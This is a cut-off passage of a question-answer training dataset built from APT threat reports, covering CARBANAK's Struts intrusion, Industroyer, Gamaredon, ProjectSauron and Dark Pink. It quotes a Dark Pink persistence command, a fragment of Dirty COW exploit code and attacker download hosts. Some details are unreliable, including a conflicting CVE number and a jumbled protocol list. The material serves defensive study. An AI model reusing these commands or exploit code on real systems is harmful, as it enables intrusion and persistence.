DETECTION AND RESPONSE\nThe client contacted RSA IR when system administrators observed anomalies associated with the 'root' user on system ALPHA during remediation. These anomalies were brought to the attention of client security personnel. The CVE-2017-5638 vulnerability present on system ALPHA was identified 25 days (D+25) after the initial compromise when hundreds of thousands of successful vulnerability scanning and exploit sessions against the system were observed. The vulnerability was determined to have been introduced by an out-of-band source installation of an affected version of Apache Struts, which had been installed by the web developers. While the organization had taken\nthe necessary steps to remediate and patch all systems reported vulnerable to CVE-2017-5638, the vulnerable web page on system ALPHA was not detected due to the web server and operating system reporting that the affected package was not installed. Based on the extensive number of successful exploit attempts that ranged from the return of a pre-defined character string to successful downloading and execution of malicious code, system ALPHA was removed from service, a forensic image was obtained for in-depth analysis and the system was restored and remediated. The forensic image was made\navailable to RSA IR upon engagement of services, with RSA IR beginning threat hunting actions and follow-on investigations on D+35.\nDuring threat hunting operations conducted in concert with client analysts, RSA IR identified increasingly suspect outbound binary and administrative network communication being conducted with external internet hosts. Specifically, RSA IR observed the GOTROJ traffic communicating outbound to IP 107.181.246.146, and client analysts observed the PSEXESVC.exe service binary present and executing on system DELTA. Both of these initial findings are shown in Figure 10 and Figure 11, respectively.\nCorrelation of these suspect security events was declared an incident on D+35, with RSA IR being immediately engaged for incident response services. At this point in the intrusion, the attackers had just entered Stage 5, as described in Section 3.1.5.\nUtilizing RSA NetWitness Logs and Packets for network visibility, RSA IR identified all network communication channels utilized by the attackers for the duration of the incident. This assisted greatly in conducting root cause analysis and intrusion scoping, as a significant amount of host forensic artifacts had been destroyed, bypassed or made unusable by the attackers.\nAdditionally, the use of this level of visibility allowed RSA IR to conduct network protocol analysis on the command and control (C2) communication payloads, which led to the capability to decrypt attacker C2 communications within minutes of their occurrence. This level of visibility into attacker activity greatly assisted in containment, eradication and remediation efforts, which concluded on D+44. Upon conclusion of the incident, RSA IR determined that the attackers had accessed 154 systems, the majority of which were accessed laterally via ingress channels established on systems ALPHA, BRAVO, CHARLIE and DELTA. Follow-on analysis of acquired host, network and disk forensic data occurred in parallel with continuous monitoring and Threat Hunting operations until incident closure on D+74.\nUtilizing RSA NetWitness Endpoint for host visibility, RSA IR was able to observe and track specific behavioral indicators of compromise (IOCs) identifying attacker activity within the environment. As the attackers were particularly careful to remove all traces of their activity upon completion and ensure their tools were on disk while in use, many traditional artifacts or log-based incident response and forensics methodologies would have been ineffective in identifying, investigating and responding to these attackers' methods. However, utilizing RSA NetWitness Endpoint in concert with RSA NetWitness Logs and Packets allowed RSA IR to use the attackers' methods as IOCs, such as specific file download methods with subsequent deletions, specific command-line arguments used by the attackers for lateral movement, and specific Windows user status command executions.\nMedium Headline: 4.1 INITIAL COMPROMISE: APACHE STRUTS2\nIn late March of 2017, in the midst of several hundred thousand external vulnerability scanning attempts, an attacker using the IP address of 185.117.88.97 executed an HTTP request against system ALPHA and exploited the Apache Struts Content-Type remote command execution vulnerability, CVE-2017-5638, in order to download and execute a Perl script named \"b\" from the IP address 95.215.45.116. Due to retention at the time of analysis, neither the Perl script nor the complete command used to initiate the download was obtained. Actions during this time were observed by network metadata creation.\nAlmost six minutes later, system ALPHA began communicating with IP address 95.216.45.116 via IRC over TCP port 80. This was the initial method of direct system communication utilized by the actors, in which they began immediate attempts to escalate privilege to the root user.\nSmall Headline: 4.2.1  'Dirty COW' Driver Script and Kre80r Proof of Concept Code\nSince the privilege-separation account for the web application server was not sufficient for follow-on actions, the attackers downloaded a shell script named \"1.sh\" that exploited the \"Dirty COW\" Linux Kernel Privilege Escalation vulnerability, CVE-2016-5165, from IP address 185.61.148.145. The other downloaded file was a modified version of the PTRACE_POKEDATA variant of CVE-2016-5195 POC code written by GitHub user \"KrE80r.\"\n.  The contents of both files are shown in Figure 12 and Figure 13, with the detection of this activity shown in RSA NetWitness Suite in Figure 14.\nelse{\npthread_create(&pth,\nNULL,\nmadviseThread,\nNULL);\nptrace(PTRACE_TRACEME);\nkill(getpid(),SIGSTOP);\npthread_join(pth,NULL);\n}\nreturn 0;  }\nFigure 13: Contents of 'c0w' Dirty COW Source Code\nBoth files were obtained via the legitimate WGET utility already present on the system. This would continue to be the attackers' primary method of acquiring tools throughout this engagement. As such, the direct-to-IP address acquisition of tools before execution became an effective actionable IOC to track the adversary throughout this engagement. An example of this activity as seen in RSA NetWitness Logs and Packets is shown in Figure 15.\n\nWhat specific actions did the CARBANAK actors take to exploit the Apache Struts vulnerability on system ALPHA, and how did they escalate privileges afterward?",
    "output": "The CARBANAK actors executed an HTTP request against system ALPHA and exploited the Apache Struts Content-Type remote command execution vulnerability, CVE-2017-5638, to download and execute a Perl script named 'b' from the IP address 95.215.45.116. Almost six minutes later, system ALPHA began communicating with IP address 95.216.45.116 via IRC over TCP port 80. This was the initial method of direct system communication utilized by the actors, in which they began immediate attempts to escalate privilege to the root user. Since the privilege-separation account for the web application server was not sufficient for follow-on actions, the attackers downloaded a shell script named '1.sh' that exploited the 'Dirty COW' Linux Kernel Privilege Escalation vulnerability, CVE-2016-5165, from IP address 185.61.148.145. The other downloaded file was a modified version of the PTRACE_POKEDATA variant of CVE-2016-5195 POC code written by GitHub user 'KrE80r.'",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Big Headline: SSL Pivot to Additional Infrastructure and Samples\nWhile conducting historical research on the infrastructure in cluster 1, we discovered a self-signed certificate associated with cluster 1 IP address 92.242.62[.]96:\nSerial: 373890427866944398020500009522040110750114845760\nSHA1: 62478d7653e3f5ce79effaf7e69c9cf3c28edf0c\nIssued: 2021-01-27\nExpires: 2031-01-25\nCommon name: ip45-159-200-109.crelcom[.]ru\nAlthough the IP Address WHOIS record for Crelcom LLC is registered to an address in Moscow, the technical admin listed for the netblock containing the IP address is registered to an address in Simferopol, Crimea. We further trace the apparent origins of Crelcom back to Simferopol, Crimea, as well.\nThis certificate relates to 79 IP addresses:\nThe common-name IP address - no Gamaredon domains\nOne IP address links to cluster 1 above (92.242.62[.]96)\n76 IP addresses link to another distinct collection of domains \u2013 \"cluster 2\"\n1 IP address led us to another distinct cluster, \"cluster 3\" (194.67.116[.]67)\nWe find almost no overlap of IP addresses between these separate clusters.\nBig Headline: File Stealer (Cluster 2)\nOf the 76 IP addresses we associate with cluster 2, 70 of them have confirmed links to C2 domains associated with a variant of Gamaredon's file stealer tool. Within the last three months, we have identified 23 samples of this malware, twelve of which appear to have been shared by entities in Ukraine. The C2 domains in those samples include:\nAs you can see, some of these domains were established months ago, yet despite their age, they continue to enjoy benign reputations. For example, only five out of 93 vendors consider the domain krashand[.]ru to be malicious on VirusTotal.\nReviewing passive DNS (pDNS) logs for these domains quickly reveals a long list of subdomains associated with each. Some of the subdomains follow a standardized pattern. For example, several of the domains use the first few letters of the alphabet (a, b, c) in a repeating combination. Conversely, jolotras[.]ru and moolin[.]ru use randomized alphanumeric characters. We believe that these subdomains are dynamically generated by the file stealer when it first establishes a connection with its C2 server. As such, counting the number of subdomains associated with a particular C2 domain provides a rough gauge of the number of entities that have attempted to connect to the server. However, it is important to also note that the number of pDNS entries can also be skewed by researchers and cybersecurity products that may be evaluating the malicious samples associated with a particular C2 domain.\nAnswer this question: How does the use of self-signed certificates by the Gamaredon group contribute to their infrastructure and what insights can be drawn from the certificate details provided?",
    "output": "The use of self-signed certificates by the Gamaredon group contributes to their infrastructure by allowing them to secure communications without relying on third-party certificate authorities, which can help evade detection. The certificate details provided reveal several key insights. First, the certificate's common name, 'ip45-159-200-109.crelcom[.]ru', suggests a link to a specific IP address and domain. Second, the WHOIS record for Crelcom LLC indicates a registration in Moscow but with technical administration in Simferopol, Crimea, suggesting a potential operational base. Third, the certificate relates to 79 IP addresses, with one linking to cluster 1, 76 linking to cluster 2, and one leading to cluster 3. This distribution shows a structured approach to managing different clusters of infrastructure, minimizing overlap and enhancing resilience.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Small Headline: About Lookout\nLookout is a cybersecurity company for a world run by apps. Powered by the largest dataset of mobile code in existence, Lookout is the security platform of record for mobile device integrity and data access. Lookout is trusted by hundreds of millions of individuals, hundreds of enterprises and government agencies, and such ecosystem partners as AT&T, Deutsche Telekom, and Microsoft. Headquartered in San Francisco, Lookout has offices in Amsterdam, Boston, London, Sydney, Tokyo, Toronto and Washington, D.C.\nSmall Headline: Contributors\nAndrew Blaich, Lookout\nApurva Kumar, Lookout\nJeremy Richards, Lookout\nMichael Flossman, Lookout\nCooper Quintin, EFF\nEva Galperin, EFF\nSpecial thanks to the many others in our organization, and to our partners, who contributed significantly to this work.\n1-888-988-5795   |   lookout.com\n\u00a9 2018 Lookout, Inc. LOOKOUT\u00ae, the Lookout Shield Design\u00ae, LOOKOUT with Shield Design\u00ae, SCREAM\u00ae, and SIGNAL FLARE\u00ae are registered trademarks of Lookout, Inc. in the United States and other countries. EVERYTHING IS OK\u00ae, LOOKOUT MOBILE SECURITY\u00ae, and PROTECTED BY LOOKOUT\u00ae, are registered trademarks of Lookout, Inc. in the United States. POWERED BY LOOKOUT\u2122 is a trademark of Lookout, Inc. All other brand and product names are trademarks or registered trademarks of their respective holders. 20180118-Lookout-USv1.0\n\nBased on the above text, answer a question. How does Lookout leverage its extensive dataset to enhance mobile security, and what role does this play in identifying and mitigating threats posed by advanced persistent threats (APTs) like Dark Caracal?",
    "output": "Lookout leverages the largest dataset of mobile code in existence to power its cybersecurity platform. This extensive dataset allows Lookout to maintain the security platform of record for mobile device integrity and data access. By analyzing this vast amount of mobile code, Lookout can identify anomalies and potential threats, enhancing its ability to detect and mitigate sophisticated cyber-espionage campaigns like those conducted by Dark Caracal. This capability is crucial for protecting the hundreds of millions of individuals, enterprises, and government agencies that trust Lookout, ensuring the integrity of their mobile devices and the security of their data.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Big Headline: ON DECEMBER 18, 2016 THE SECOND POWER OUTAGE OCCURRED IN UKRAINE CAUSING SOME BLACKOUTS IN KIEV FOR LESS THAN ONE HOUR. THIS WAS THE TIME NEEDED FOR AN EXPERT TEAM TO GO ONSITE AND FIX THE PROBLEM USING A MANUAL PROCEDURE.\nThis second attack was targeting another grid company named Ukrenergo. This incident caused multiple blackouts in the Ukrainian capital - Kiev and a complete power loss for the northern part of Kiev on the right bank of the Dnieper river and the surrounding region.\nExperts of the grid company were able to fix the situation in less than 1 hour with a manual procedure. This emergency response team was on site 30 minutes after the outage.\nThe faulty component was the automation control systems piloting a substation in a village near the Kiev city. Automation systems in such substations control how power coming from power plants at high voltage is transformed to lower voltage for consumer and industrial use.\nThe main website of the power grid had been unreachable for a couple of days during and after the attack. The head of Ukrenergo had to publish a quick statement on Facebook (provided in the appendix).\nWhen the situation had been recovered, the company published an official statement available on their website.\nIt states \"Among the possible causes of failure are considered hacking and equipment malfunction (crashes). Timely police were involved and conducted a thorough investigation into the accident, which will be to inform the public. By the end of the official investigation into the case management of all objects SE 'NEC' Ukrenergo with automatic control system was transferred to the local level.\"\nIn the middle of January Ukrenergo confirmed that the source cause of this power outage was malicious. The authors are still undetermined.\nBased on an article from Reuters, Ukrenergo said in comments emailed to Reuters: \"Preliminary findings indicate that workstations and Supervisory Control and Data Acquisition (SCADA) systems, linked to the 330 kilowatt sub-station \"North\", were influenced by external sources outside normal parameters. [...] The analysis of the impact of symptoms on the initial data of these systems indicates a premeditated and multilevel invasion\"\nLaw enforcement officials and cyber experts are still working to compile a chronology of events, draw up a list of compromised\naccounts, and determine the penetration point while tracing computers potentially infected with malware in sleep mode.\nSo far, no huge technical details related to the attack have been released publically. Indeed Marina Krotofil from Honeywell and Oleskii Yasinskiy from ISSP shared some information confirming the attack without going further concerning technical details related to this attack.\nAccording to CyberX, a targeted malware campaign called BugDrop could have been performed in the reconnaissance phase. Indeed, the goal was to retrieve a maximum amount of information regarding the final target which was the power grid. The complexity of the malware was quite impressive. Once the target was infected through a targeted phishing campaign and the malware deployed, it retrieved a lot of information from the network and also screenshots, documents, passwords and audio recordings using the microphone. For each infected target, the data was encrypted with Blowfish using a \"user-ID\". The exfiltration was performed through Dropbox services. The assumption linking this malware and the attack is detailed in the claims section below.\nBig Headline: THE 12TH OF JUNE 2017, RESEARCHER ANTON CHEREPANOV FROM ESET PUBLISHED A COMPREHENSIVE TECHNICAL REPORT REGARDING THE MALWARE CALLED INDUSTROYER. DRAGOS HAS ALSO PROVIDED AN IN-DEPTH ANALYSIS UNDER THE NAME OF CRASHOVERRIDE.\nTHIS MALWARE IS PROBABLY LINKED TO THE DECEMBER 2016 UKRAINE ATTACK. INDEED,THIS MALWARE HAS BEEN DESIGNED TO DISRUPT THE WORKING PROCESS OF INDUSTRIAL CONTROL SYSTEMS\nUSED IN ELECTRICAL SUBSTATIONS.\nINDUSTROYER / CRASHOVERRIDE is the first OT malware designed specifically to attack electric grids.\nThis malware supports four differents industrial protocols:\nIEC 60870-5-101 (aka IEC 101)\nIEC 60870-5-104 (aka IEC 104)\nIEC 61850\nIt is obvious that since the first 2015 attack (using Blackenergy and Killdisk) and this malware, there is a huge gap and attackers have improved their capacities. The malware is now able to control switches and breakers. ESET have seen indications that this malware could have been the tool used by attackers to cause the power outage in December 2016. The infection vector remains unknown but the investigation is still ongoing.\nOLE for Process Control Data Access (OPC DA)\nBefore going deeper into the malware, let's have a look at embedded components. As we can see in the schematic below, the malware embeds:\nTwo backdoors (C&C through HTTPS)\nA launcher\nA wiper\nFour differents payloads corresponding to four different industrial protocols\nRegarding the C&C it is interesting to note that a local proxy configuration has been hardcoded in the malware. The local proxy is the way to access the Internet from the local network. This configuration is adapted to the local network. The fact that the local proxy has been hardcoded in the malware, means having technical knowledge about the target. Due to this, we can conclude that it was a targeted attack. In addition, without proper modification of the malware, it cannot be used on another target.\nAnother interesting thing is the way the malware deploys the backdoor to the victim to be able to spawn a shell, download a file and execute a program. At the beginning, when the backdoor is executed on the victim, it stays in\nRAM and starts communicating with the C&C. At this moment, through the C&C, information related to the victim is exfiltrated and analyzed to find vulnerabilities on the targeted system. Once found, the exploit is sent through the backdoor (still in ram) to perform a privilege escalation. And now the fun part begins:\nAn initial persistent backdoor (the main) is deployed to replace a non-critical Windows service.\nA second persistent backdoor (the backup) is installed through a malicious Microsoft Notepad on the victim. Each time the Notepad is used the backdoor is also executed.\nBig Headline: IEC 101 PAYLOAD COMPONENT\nThe payload uses the IEC101 protocol (IEC 60870-5-101) which is used for communications between industrial control systems and remote terminal units. If the target machine communicates with a RTU using IEC101, the IEC101 payload is used. It parses a configuration file created by the hacker to determine the process's target, it kills it and opens COM ports to communicate with the RTU and also to prevent the original process from communicating with the RTU. Once the communication has been established, the malware sends IEC101 C_SC_ NA_1 and C_DC_NA_1 packets to switch off the RTU at the specified Information Object Address (IOA).\nMedium Headline: IEC 61850 PAYLOAD COMPONENT\nThis payload uses the IEC 61850 standard. This standard describes a protocol used for multi-vendor communication among devices that perform protection, automation, metering, monitoring, and control of electrical substation automation systems. The 61850 payload uses only a small subset of the protocol to produce its disruptive effect. The payload looks for a configuration file defining targets and commands as seen previously. If the payload does not find the file, it starts to scan the network for TCP port 102 (used by IEC 61850). Once found, the payload sends a connection request packet using the COTP protocol. If successful, it sends a InitiateRequest and a getNameList request to compile a list of targets, variables and contents. Afterwards, the payload parses received data for variables that contain the strings CSW (corresponds to logical nodes used to control circuit breakers and switches). For each of them it will try a read and a write order to change the position of the breaker.\nBig Headline: IEC 104 PAYLOAD COMPONENT\nThis payload uses the IEC104 protocol (IEC 60870-5-104) which is used to send IEC101 on a TCP/IP network.Similar to the IEC101 payload, the DLL reads a configuration file containing information regarding the target including the IP address, the port, the ADSU (Application Service Data Unit) and the operation. The goal of this payload is to connect to a specified IP address and send packets with the ASDU address to interact with the IOA to switch it off. The OT impact is quite important. By using this payload, the malware is able to communicate on the OT network using the IEC104 protocol and to send orders to breakers. At the same time, the malware is also able to communicate on the IT network to receive orders from the C&C servers located outside of the target.\n\nQuestion: How did the Industroyer/CrashOverride malware establish persistence on the victim's system and what was the significance of the hardcoded local proxy configuration?\n\nAnswer:",
    "output": "The Industroyer/CrashOverride malware established persistence by deploying two backdoors: an initial persistent backdoor that replaced a non-critical Windows service and a backup backdoor installed through a malicious Microsoft Notepad. The significance of the hardcoded local proxy configuration was that it indicated a targeted attack, as the malware required specific technical knowledge about the target's network. Without proper modification, the malware could not be used on another target.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Small Headline: China's Oil Production in Thousands of Barrels per Day22\nAs seen in the chart above, China experienced a significant increase in oil production during 2009. This spike in production could be due to information that China gained from US firms through cyber espionage actions, such as Night Dragon. The Night Dragon attacks were believed to have begun circa 2007. According to Kirk, information taken during these attacks includes market intelligence reports and information on operational production systems.23  Similarly, the Mandiant report shows that the APT1 group has monitored Mandiant's energy industry customers from approximately the beginning of 2009 to 2012.24 During these attacks, APT1 would export terabytes of data from the victims to China. In tandem with these revelations, China's also aggressively pursued oil supply contracts during 2009.25 During this time major Chinese state oil companies acquired holdings in 18 different countries. China is determined to take on oil and gas infrastructure development and to acquire oil industry assets.26\nAlthough there is evidence that China has been conducting cyber espionage activities against oil industry targets as far back as 2007, there is only trivial growth until 2009. This could be a result of the time and recourse commitment required to process the data that was acquired. As mentioned, both the Night Dragon and APT1 attacks stole an enormous amount of data from English speaking companies. It is necessary for English-fluent operators to sift through this data and extract actionable information to report. This information would also need to be provided to experts in the field who could recognize the its vale, and that process would have to be done discreetly so as not to arouse suspicions. This would take time. The Mandiant report comments on the fact that there are limited English-fluent operators directly involved in the technical end of APT1, which would significantly hinder progress.27 Considering these factors and the timeframe for growth presented above, it is conceivable that the information and strategy for its use would not be available until 2009. At this point, China could act to increase the output of the holdings that they currently owned. Also, the information gained from market intelligence reports and possibly exploration reports could guide the state companies in deciding which new holdings to purchase during this time period. The new holdings would allow for increased output overall.\nSmall Headline: China's Investments\nChina's fervor for oil acquisition has not been limited to aggressive increases in holdings and contracts. These activities are likely only one piece of a global strategy to secure China's future oil requirements, including reserves that may not be productive today or in the immediate future. This overarching strategy has apparently led to a pattern of quiet investment, which may be a direct cause for concern in America. An article appearing in the Associated Press discusses these Chinese investments in Venezuela, the country with the largest proven oil reserves as of 2011, and throughout the Caribbean and South America. The article notes that \"when Venezuela seized billions of dollars in assets from Exxon Mo-\n22 U.S. Energy Information Administration.  (2013, February 12).  International Energy Statistics [Data file].  Retrieved from http://www.eia.gov/cfapps/ipdbproject/iedindex3.cfm?tid=5&pid=53&aid=1&cid=CH,&syi d=2006&eyid=2012&unit=TBPD\n23 Kirk, J. (2011, February 10). 'Night dragon' attacks from china strike energy companies. Retrieved from http://www.networkworld.com/news/2011/021011-night-dragon-attacks-from-china.html\n24 Mandiant. (2013, February 18). APT1: Exposing one of China's cyber espionage units. Retrieved from http://intelreport.mandiant.com/Mandiant_APT1_Report.pdf\n25 Hayward, D.L.L.  (2009, June 18).  China's oil supply dependence.  Journal of Energy Security.  Retrieved from: http://www.ensec.org/index.php?option=com_content&view=article&id=197:chinas-oil-supply-dependen ce&catid=96:content&Itemid=345\n26 Ibid.\n27 Mandiant. (2013, February 18). APT1: Exposing one of China's cyber espionage units. Retrieved from http://intelreport.mandiant.com/Mandiant_APT1_Report.pdf\nbil and other foreign companies, Chinese state banks and investors didn't blink. Over the past five years they have loaned Venezuela more than $35 billion.\" They have similarly provided aid to countries like Ecuador, another country within the top 20 of proven oil reserves. In some cases it appears that the Chinese are making loans that the countries will likely be incapable of repaying, placing them squarely within China's control. Many of the deals included \"repayment in oil and natural gas\" and billions of dollars have been loaned directly to energy companies in Russia and Turkmenistan, both of which have been targeted in cyber espionage campaigns and are in the top 5 for proven natural gas reserves.\nAlthough the IEA has predicted that America is moving towards energy independence and is poised to become the number one oil exporter by 2017, the loans are breeding closeness with and reliance on China by countries in close proximity to the US. This could allow for the Chinese to weaken American influence in the region and create agitation against the US or between other countries within the region in order to distract the US from its goals in other areas strategic to the Chinese. These deals also place China in the supply chain for borrowers' projects where China has insisted on Chinese companies being involved as a stipulation of the loan. These loans have not required any economic reforms to accompany them, meaning that countries which could not secure a loan from the IMF due to poor financial decisions may continue to flounder in spite of aid, perhaps even more so because of it. In the worst case scenario, these countries become unstable. While this may cause issues to the Chinese in some logistical capacities, it would also serve to divert some of America's attention, making the situation a palatable outcome for China.\nSmall Headline: Other actors\nAn analysis of these events would be remiss without exploring any other possible attribution. Though unlikely, it is possible that there were other actors involved. As pointed out by Eugene Kaspersky in his criticism of the Shady RAT report, some of the tools and techniques are generic enough to not lend themselves to attribution to a particular entity. Even the ones that are of Chinese origin do not of themselves implicate the Chinese government, only an actor familiar with how the tool works or minimally trained in Mandarin. A large portion of these tools were freely available on underground Chinese hacking sites. Chinese hacking collectives or corporations may have been independently involved. However, due to the suspicions voiced in the leaked diplomatic cables suggesting PLA involvement28 and Mandiant's research on the topic indicating the same29 , it is highly unlikely that the Chinese government was not involved whatsoever. These sources, and the timeframe in which the attacks occurred -- between roughly 9am and 5pm consistently over a protracted period of time3031 -- is indicative of a formalization of the activity. This is further evidenced by the resources required to carry out the attack and the Chinese government's grasps on censorship of their citizens through technical controls. Terabytes of data infiltrating the country is unlikely to have been missed, particularly over the course of a decade of activity.\nIf China had been involved in any capacity in cyber espionage attacks and this had been discovered by another entity, said entity might have leveraged this knowledge to collude with them either through coercion, cooperation, or clandestinely without the Chinese government knowing. Though this may seem farfetched, a report released by a Luxemburg security firm details how, in the wake of Mandiant's APT1 report, they decided to engage in an intelligence gathering operation on the APT groups operating out of China. By scanning Chinese IP ranges for C2 servers known to be used in the APT1 attacks and exploiting weaknesses in the attackers' C2 infrastructure, they were able to access, monitor, and control the APT infrastructure without the adversary's knowledge. Bloomberg also hinted at the possibility of American security firms acting in a similar way when they \"exploit[ed] a hole in the hackers' security \u2026 logging the intruders' every move as they crept into networks...\" Knowing that the Chinese were actively engaged in such operations and likely turning a blind eye to any infiltration of data, another actor operating through China and attempting to incriminate China could have engaged in cyber espionage as well. This is truly a stretch of the imagination, and there is no evidence whatsoever to support this theory. The most likely case for any attribution involves the Chinese government in some capacity.\n28  Glanz, J. & Markoff, J. (Dec 4 2010). Vast Hacking by a China Fearful of the Web. Retrieved from http:// www.nytimes.com/2010/12/05/world/asia/05wikileaks-china.html?pagewanted=all&_r=0\n29  Mandiant. (Feb, 2013). APT1: Exposing One of China's Cyber Espionage Units. Retrieved from http:// www.mandiant.com/APT1\n30  Ibid.\n31  McAfee\u00ae Foundstone\u00ae Professional Services and McAfee Labs\u2122. (Feb 10, 2011). Global Energy Cyberat-tacks: \"Night Dragon\". Retrieved from http://www.mcafee.com/us/resources/white-papers/wp-global-energy-cyberattacks-night-dragon.pdf\n\nQ: How could other actors potentially leverage knowledge of China's cyber espionage activities, and what are the limitations of this theory?",
    "output": "A: Other actors could potentially leverage knowledge of China's cyber espionage activities by engaging in intelligence gathering operations on the APT groups operating out of China. For example, a Luxembourg security firm accessed, monitored, and controlled the APT infrastructure without the adversary's knowledge by exploiting weaknesses in the attackers' command and control (C2) infrastructure. Similarly, Bloomberg hinted at American security firms exploiting holes in the hackers' security to track their movements. While it is theoretically possible that another actor could have engaged in cyber espionage through China to incriminate them, this theory lacks evidence and is considered a stretch of the imagination. The most likely attribution for these activities still involves the Chinese government in some capacity.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does the ProjectSauron APT use lateral movement to achieve its objectives, and what techniques does it employ to remain stealthy?",
    "output": "Lateral movement is a critical aspect of an adversary's strategy, allowing them to move through a network, gain access to remote systems, and ultimately achieve their objectives. In the case of the ProjectSauron APT, lateral movement is a key component of its operations. According to the research, ProjectSauron uses legitimate channels of software distribution for lateral movement within infected networks. Specifically, it injects a command to start the malware by modifying existing software deployment scripts, which allows it to spread to other systems in the network. Additionally, ProjectSauron installs implants on other intranet servers that have both Internet access and generate a lot of network traffic, such as proxy-servers, web-servers, or software update servers. These intermediary servers are then used as internal proxy nodes for silent and inconspicuous data exfiltration, blending in with high volumes of other legitimate traffic. To remain stealthy, ProjectSauron employs techniques such as using strong encryption algorithms, implementing a modified Lua scripting engine, and utilizing a virtual file system to store additional modules. Furthermore, it uses legitimate credentials with native network and operating system tools, making it even harder to detect. Overall, ProjectSauron's lateral movement capabilities are highly sophisticated, allowing it to move undetected through a network and achieve its objectives.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does the media's role in covering threat intelligence contribute to the complexity of the attribution landscape?",
    "output": "The media's role in covering threat intelligence contributes to the complexity of the attribution landscape by entertaining any sign of contention in the research community, often lending credence to doubt even where there is little ambiguity. This has led to the rise of professional cyber-truthers who build careers on sparsely substantiated contrarian attributory claims. While legitimate disagreement in the research community should not be diminished, the media's approach has amplified sniping between competing vendors and skeptics, who are eager to disparage popular research at face value. This dynamic not only complicates the attribution process but also erodes trust in threat intelligence as a whole, especially when vendors adopt a closed-door approach to distributing their products, making it difficult for third parties to verify the value of the research.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Kill Chain 1: All-inclusive ISO\nThe first variant of the infection chain results in an ISO image being sent to the victim through spear-phishing emails. This ISO image includes a malicious DLL file, which contains TelePowerDropper (name given by Group-IB). The primary goal of this DLL file is to gain persistence for TelePowerBot in the registry of the infected machine. In some cases, the DLL file can also launch the threat actors' proprietary stealer Stealer, which parses data from browsers on the victim's machine and stores it in a local folder. It is important to note that launching any kind of stealer is optional during initial access. Dark Pink can send special commands to download and launch a stealer during all phases of attack.\nIt is important to note at this stage that the DLL files are packed. When the file is launched, it decrypts itself and passes control to an unpacked version of itself. Additionally, once the DLL file is launched, a mutex will be created. One example of this was: gwgXSznM-Jz92k33AuRcCCksA-9XAU93r5. Upon completion of this step, a command to start TelePowerBot will be added to autorun. This means that TelePowerBot will be launched each time the user logs into their system. This is facilitated by creating a registry key by path HKCU\\Environment\\UserInitMprLogonScript. The value of the created key is as follows:\nforfiles.exe /p %system32% /m notepad.exe /c \"cmd.exe /c whoami >> %appdata%\\a.abcd && %appdata%\\a.abcd && exit\"\nThe above code reveals that the command launches a standard utility, whoami, which shows information about the current user of the machine. The output is redirected to a file and execution is finished.\nAt this point it might not be entirely clear how the next stage, and the launching of TelePowerBot, begins. The key to this answer is the file extension .abcd. In short, the threat (<https://attack.mitre.org/techniques/T1546/001/>)actors create a file with this extension name as part of a technique termed Event Triggered\nThe above screenshot details part of a PowerShell command that is triggered when a file is created with the specific extension .abcd. The PowerShell commands are stored in base64 view and are highly obfuscated. The result of these commands are relatively simple: read registry key, decrypt, and launch TelePowerBot.\nBig Headline: Kill Chain 2: Github macros\nThe second variation of the infection chain is almost identical to the preceding one. The only thing that differs is the file used in the initial stage. During our analysis, we discovered that the threat actors used commands to automatically download a malicious template document containing TelePowerBot from Github upon opening of the .doc contained in the initial ISO file. Macro code written into this template document then works to ensure persistence for the malware.\nIn this instance, the ISO image sent to the victims contains a MS Word document that leads to the automatic download of a malicious template document, which contains TelePowerBot, from Github. In order to evade antivirus defenses on an infected machine during initial access, macro code is written into the template document. This technique is known as (<https://attack.mitre.org/techniques/T1221/>)Template Injection. The macro contains several forms with fields, and during execution, the value of these form fields are read and established as a value in registry keys.\nThis trick can help the malware avoid detection by antivirus software, as the document itself does not contain any malicious functionalities or code. The coded documents contain forms with several parameters, and the macros contained in these files can read these values and work to ensure persistence of TelePowerBot on the victim's machine.\nBig Headline: Kill Chain 3: X(ML) marks the spot\nThe third and final kill chain variant that we will detail is one that was used in the most recent Dark Pink attack analyzed by Group-IB, which saw the threat actors breach the network of an Indonesian government agency on December 8, 2022. The ISO image sent to the victim in a spear-phishing email contained decoy documents, a signed legitimate MS Word file, and a malicious DLL named KamiKakaDropper. The primary goal of this infection vector is to persist KamiKakaBot on infected machines. In this kill chain, an XML file is located at the end of the decoy document in encrypted view. The malicious DLL file is, as in Kill Chain 1, launched by the DLL Side-Loading technique. Once the DLL file is launched, the XML file that kicks off the next stage of the kill chain will be decrypted from the decoy document and saved in the infected machine.\nThe XML file contains an MSBuild project that includes a task to execute .NET code. To find more about how this process works, please refer to the (<https://learn.microsoft.com/en-us/visualstudio/msbuild/msbuild-tasks?view=vs-2022>)following Microsoft documentation. The logic of the .NET code is simple: launch KamiKakaBot, which itself is located in the XML file (packed and encoded in base64 format). After this file is unpacked, control is passed to KamiKakaBot.\nThe path to the XML file is passed as an argument upon the launch of MSBuild. The command to run MSBuild is located in the registry key\n(HKCU\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Shell), which is created during execution of the DLL file. Once this step is completed, MSBuild will run each time a user logs on to the system. In addition, the DLL creates a repeatable task to log the victim off from the system.\nBig Headline: Reconnaissance and lateral movement\nAfter infecting a computer in the victim organization's network, the next goal for Dark\nPink is to collect as much information as possible about the victim's network infrastructure. From our analysis, we see that the threat actors are interested in the following:\ninformation from standard utility, e.g output of standard utility systeminfo.\ninformation from web browsers.\ninstalled software, including antivirus solutions.\ninformation about connected USB devices and network sharing.\nThe threat actors also collect a list of network and USB drives that are available for writing, and these are then used for lateral movement. Next, instead of the original file, the attack sees the creation of a LNK file (Windows shortcut) with a command to launch TelePowerDropper. At this stage, the original files are hidden from the user.\nOne of the most interesting revelations of our investigation into Dark Pink was how the threat actors carry out lateral movement over USB devices. For this, a new WMI event handler is registered. From this point onwards, each time a USB flash drive is plugged into an infected machine, a specific action will be executed that sees TeleBotDropper downloaded and stored on the flash drive. Let's analyze this process a little deeper.\n1. Victim plugs USB flash drive into infected device\n2. The WMI event is triggered, and results in the automatic download of a .ZIP archive from the threat actors' Github account. There are three files inside this archive: Dism.exe, Dism.sys, and Dismcore.dll. The first of these 